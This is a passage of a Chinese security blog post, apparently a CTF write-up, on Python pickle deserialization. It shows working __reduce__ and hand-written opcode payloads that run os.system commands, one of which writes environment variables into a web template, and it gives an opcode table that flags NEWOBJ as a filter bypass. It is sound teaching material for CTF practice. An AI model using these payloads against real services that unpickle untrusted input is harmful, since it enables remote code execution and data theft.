class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p>可见是一个pickle注入题目<br>而登录时对starven学长说的话就是需要注入的内容,需要base64加密<br>那么构造如下poc:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(<span class="string">&quot;111&quot;</span>)))</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">111</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;xxx&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(<span class="string">&quot;gASVOQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCFlY2hvICIyMjIiPiBmaW5kIC1uYW1lIGpva2VyLmh0bWyUhZRSlC4=&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>即可执行任意命令，本想弹shell，结果弹shell的各种方法被过滤，<br>另寻他法后发现index.html的文件位置精确的暴露了，那么我们只要将执行命令的回显写入即可:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;env &gt; templates/index.html&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure>
+<p>再回到首页即可成功获得flag<br>当然预期解的打法那就是写内存马</p>
+<h5 id="2025TSGCTF"><a href="#2025TSGCTF" class="headerlink" title="2025TSGCTF"></a>2025TSGCTF</h5><p>直接使用nc连接，</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x80\x03&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;cbuiltins\ntuple\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;cbuiltins\nmap\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x28&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;cos\nsystem\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x28&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;S\&#x27;cat flag.txt\&#x27;\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;l&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;t&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x85&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+
+<p>这里首先设置了协议为3，不过实际测试似乎不需要</p>
+<p>然后实现的操作实际上是</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tuple</span>(<span class="built_in">map</span>(os.system, [<span class="string">&#x27;cat flag.txt&#x27;</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>这里的思路和java反序列化中cc链有异曲同工之妙</p>
+<h3 id="pickle完整操作码表"><a href="#pickle完整操作码表" class="headerlink" title="pickle完整操作码表"></a>pickle完整操作码表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hex    ASCII    Name             Description (中文描述)</span><br><span class="line">================================================================================</span><br><span class="line"><span class="comment"># 基础通用指令 (Protocol 0 - 1) - 大多对应可见字符</span></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">\x28   (        MARK             压入标记对象 (MARK)，用于界定列表/元组范围</span><br><span class="line">\x29   )        EMPTY_TUPLE      压入一个空元组</span><br><span class="line">\x2e   .        STOP             反序列化结束 (Stop)，返回栈顶元素</span><br><span class="line">\x30   <span class="number">0</span>        POP              弹出(丢弃)栈顶元素</span><br><span class="line">\x31   <span class="number">1</span>        POP_MARK         弹出栈顶直到遇到标记 (MARK) 并丢弃</span><br><span class="line">\x32   <span class="number">2</span>        DUP              复制栈顶元素并再次压入</span><br><span class="line">\x46   F        FLOAT            压入浮点数 (文本格式)</span><br><span class="line">\x47   G        BINFLOAT         压入浮点数 (<span class="number">8</span>字节二进制格式)</span><br><span class="line">\x49   I        INT              压入整数 (文本格式)</span><br><span class="line">\x4a   J        BININT           压入<span class="number">4</span>字节有符号整数</span><br><span class="line">\x4b   K        BININT1          压入<span class="number">1</span>字节无符号整数</span><br><span class="line">\x4c   L        LONG             压入长整数</span><br><span class="line">\x4d   M        BININT2          压入<span class="number">2</span>字节无符号整数</span><br><span class="line">\x4e   N        NONE             压入 <span class="literal">None</span></span><br><span class="line">\x50   P        PERSID           压入持久化ID对象</span><br><span class="line">\x51   Q        BINPERSID        压入持久化ID对象 (二进制)</span><br><span class="line">\x52   R        REDUCE           执行函数 (取出栈顶元组作为参数，次栈顶作为函数执行)</span><br><span class="line">\x53   S        STRING           压入字符串 (文本格式，引号包裹)</span><br><span class="line">\x54   T        BINSTRING        压入字符串 (二进制格式)</span><br><span class="line">\x55   U        SHORT_BINSTRING  压入短字符串 (长度 &lt; <span class="number">256</span>)</span><br><span class="line">\x56   V        UNICODE          压入 Unicode 字符串</span><br><span class="line">\x58   X        BINUNICODE       压入 Unicode 字符串 (二进制)</span><br><span class="line">\x5d   ]        EMPTY_LIST       压入一个空列表</span><br><span class="line">\x61   a        APPEND           将对象追加到列表 (stack[-<span class="number">1</span>] append to stack[-<span class="number">2</span>])</span><br><span class="line">\x62   b        BUILD            通过 setstate 或 <span class="built_in">dict</span> 更新构建对象</span><br><span class="line">\x63   c        GLOBAL           导入全局对象 (格式: module\nname\n)</span><br><span class="line">\x64   d        DICT             构建字典 (从 MARK 开始)</span><br><span class="line">\x65   e        APPENDS          扩展列表 (将切片扩展到列表)</span><br><span class="line">\x66   f        PUT              (已废弃) 同 PUT</span><br><span class="line">\x67   g        GET              从 Memo 获取对象 (文本索引)</span><br><span class="line">\x68   h        BINGET           从 Memo 获取对象 (<span class="number">1</span>字节二进制索引)</span><br><span class="line">\x69   i        INST             构建类实例 (相当于 c + o)</span><br><span class="line">\x6a   j        LONG_BINGET      从 Memo 获取对象 (<span class="number">4</span>字节二进制索引)</span><br><span class="line">\x6c   l        LIST             构建列表 (从 MARK 开始)</span><br><span class="line">\x6f   o        OBJ              构建类对象 (利用栈上的参数)</span><br><span class="line">\x70   p        PUT              存入 Memo (文本索引)</span><br><span class="line">\x71   q        BINPUT           存入 Memo (<span class="number">1</span>字节二进制索引)</span><br><span class="line">\x72   r        LONG_BINPUT      存入 Memo (<span class="number">4</span>字节二进制索引)</span><br><span class="line">\x73   s        SETITEM          字典赋值 (d[k]=v)</span><br><span class="line">\x74   t        TUPLE            构建元组 (从 MARK 开始)</span><br><span class="line">\x75   u        SETITEMS         字典批量赋值</span><br><span class="line">\x7d   &#125;        EMPTY_DICT       压入一个空字典</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二进制扩展指令 (Protocol 2, 3, 4+) - 无 ASCII 对应</span></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">\x80   N/A      PROTO            声明协议版本 (如 \x80\x03)</span><br><span class="line">\x81   N/A      NEWOBJ           实例化类 (调用 __new__，WAF 绕过神器)</span><br><span class="line">\x82   N/A      EXT1             扩展代码 (<span class="number">1</span>字节)</span><br><span class="line">\x83   N/A      EXT2             扩展代码 (<span class="number">2</span>字节)</span><br><span class="line">\x84   N/A      EXT4             扩展代码 (<span class="number">4</span>字节)</span><br><span class="line">\x85   N/A      TUPLE1           构建单元素元组 (无需 MARK)</span><br><span class="line">\x86   N/A      TUPLE2           构建双元素元组 (无需 MARK)</span><br><span class="line">\x87   N/A      TUPLE3           构建三元素元组 (无需 MARK)</span><br><span class="line">\x88   N/A      NEWTRUE          压入 <span class="literal">True</span></span><br><span class="line">\x89   N/A      NEWFALSE         压入 <span class="literal">False</span></span><br><span class="line">\x8a   N/A      LONG1            长整数 (<span class="number">1</span>字节长度前缀)</span><br><span class="line">\x8b   N/A      LONG4            长整数 (<span class="number">4</span>字节长度前缀)</span><br><span class="line">\x8c   N/A      SHORT_BINUNICODE 短 Unicode 字符串 (长度 &lt; <span class="number">256</span>)</span><br><span class="line">\x8d   N/A      BINUNICODE8      长 Unicode 字符串 (<span class="number">8</span>字节长度前缀)</span><br><span class="line">\x8e   N/A      BINBYTES8        长 Bytes 对象 (<span class="number">8</span>字节长度前缀)</span><br><span class="line">\x8f   N/A      EMPTY_SET        压入空集合 (<span class="type">Set</span>)</span><br><span class="line">\x90   N/A      ADDITEMS         向集合添加元素</span><br><span class="line">\x91   N/A      FROZENSET        构建不可变集合 (Frozenset)</span><br><span class="line">\x92   N/A      NEWOBJ_EX        实例化类 (带关键字参数)</span><br><span class="line">\x93   N/A      STACK_GLOBAL     栈上导入全局对象 (Protocol <span class="number">4</span>+)</span><br><span class="line">\x94   N/A      MEMOIZE          自动存入 Memo (无需指定索引)</span><br><span class="line">\x95   N/A      FRAME            帧标记 (用于分块传输)</span><br><span class="line">\x96   N/A      BYTEARRAY8       压入 ByteArray 对象</span><br><span class="line">\x97   N/A      NEXT_BUFFER      压入带外缓冲区 (Pickle <span class="number">5</span>)</span><br><span class="line">\x98   N/A      READONLY_BUFFER  设为只读缓冲区 (Pickle <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://ireel.github.io">ivory</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://ireel.github.io/2025/12/29/pickle-unserialize/">http://ireel.github.io/2025/12/29/pickle-unserialize/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://ireel.github.io" target="_blank">ivory's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/pickle/">pickle</a></div><div class="post-share"><div class="social-share" data-image="/img/logo/Python.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img class="cover" src="/img/logo/Python.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">python沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">Python 沙箱逃逸栈帧逃逸2025 mini-L pyboximport multiprocessingimport sysimport ioimport astclass SandboxVisitor(ast.NodeVisitor):    forbidden_attrs = &#123;        &quot;__class__&quot;, &quot;__dict__&quot;, &quot;__bases__&quot;, &quot;__mro__&quot;, &quot;__subclasses__&quot;,        &quot;__globals__&quot;, &quot;__code__&quot;, &quot;__closure__&quot;, &quot;__func__&quot;, &quot;__self__&quot;,        &quot;__module__&quot;, &quot;__import__&quot;, &quot;__builtins__&quot;,...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-29</div><div class="info-item-2">python沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">Python 沙箱逃逸栈帧逃逸2025 mini-L pyboximport multiprocessingimport sysimport ioimport astclass SandboxVisitor(ast.NodeVisitor):    forbidden_attrs = &#123;        &quot;__class__&quot;, &quot;__dict__&quot;, &quot;__bases__&quot;, &quot;__mro__&quot;, &quot;__subclasses__&quot;,        &quot;__globals__&quot;, &quot;__code__&quot;, &quot;__closure__&quot;, &quot;__func__&quot;, &quot;__self__&quot;,        &quot;__module__&quot;, &quot;__import__&quot;, &quot;__builtins__&quot;,...</div></div></div></a><a class="pagination-related" href="/2025/12/29/pollution/" title="原型链污染(js&#x2F;python)"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-29</div><div class="info-item-2">原型链污染(js&#x2F;python)</div></div><div class="info-2"><div class="info-item-1">原型链污染原型和原型链和类和对象的继承关系很像对比起来理解就很容易了: javascripthttps://blog.csdn.net/qq_51586883/article/details/119867720例子: function person()&#123;    this.name=&quot;liahuqiu&quot;;    this.test=function () &#123;        return 23333;​    &#125;&#125;person.prototype.a=3;web=new person();console.log(web.test());console.log(web.a)  假设有merge函数 function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key],...</div></div></div></a><a class="pagination-related" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-16</div><div class="info-item-2">flask_ssti内存马</div></div><div class="info-2"><div class="info-item-1">内存马https://www.cnblogs.com/gxngxngxn/p/18181936这里的内存不是二进制那些高深的概念就是改变某些在请求过程中，会起到作用的属性和方法，从而达到我们的目的写内存马的前提不同于文件马需要实现的是代码执行而不是文件读写 利用脚本找出ssti中存在的evalimport requestsurl = &quot;http://127.0.0.1:5000?name=&quot;for i in range(0,400):    payload=&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot; + str(i) + &quot;].__init__.__globals__.__builtins__.eval(&#x27;print(0)&#x27;)&#125;&#125;&quot;    response = requests.get(url=url+payload)    if response.status_code == 200:       ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ivory</div><div class="author-info-description">或许你的思绪也能存活千年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ireel"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle"><span class="toc-number">1.</span> <span class="toc-text">Pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.0.1.</span> <span class="toc-text">能够序列化的对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opcode%E5%92%8CBytecode"><span class="toc-number">1.0.2.</span> <span class="toc-text">opcode和Bytecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle-opcode"><span class="toc-number">1.0.3.</span> <span class="toc-text">pickle opcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.0.4.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-ez-python"><span class="toc-number">1.0.4.0.1.</span> <span class="toc-text">2024极客大挑战-ez_python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2025TSGCTF"><span class="toc-number">1.0.4.0.2.</span> <span class="toc-text">2025TSGCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C%E7%A0%81%E8%A1%A8"><span class="toc-number">1.0.5.</span> <span class="toc-text">pickle完整操作码表</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python沙箱逃逸"/></a><div class="content"><a class="title" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸">python沙箱逃逸</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pickle反序列化"/></a><div class="content"><a class="title" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化">pickle反序列化</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pollution/" title="原型链污染(js/python)"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="原型链污染(js/python)"/></a><div class="content"><a class="title" href="/2025/12/29/pollution/" title="原型链污染(js/python)">原型链污染(js/python)</a><time datetime="2025-12-29T08:38:42.000Z" title="发表于 2025-12-29 16:38:42">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask_ssti内存马"/></a><div class="content"><a class="title" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马">flask_ssti内存马</a><time datetime="2025-07-16T09:39:48.000Z" title="发表于 2025-07-16 17:39:48">2025-07-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/10/Upload-LFI-plus/" title="Upload_LFI补课"><img src="/img/upload.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Upload_LFI补课"/></a><div class="content"><a class="title" href="/2025/06/10/Upload-LFI-plus/" title="Upload_LFI补课">Upload_LFI补课</a><time datetime="2025-06-10T12:39:58.000Z" title="发表于 2025-06-10 20:39:58">2025-06-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/Commedia/videoframe_248026.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By ivory</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="13468436268" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
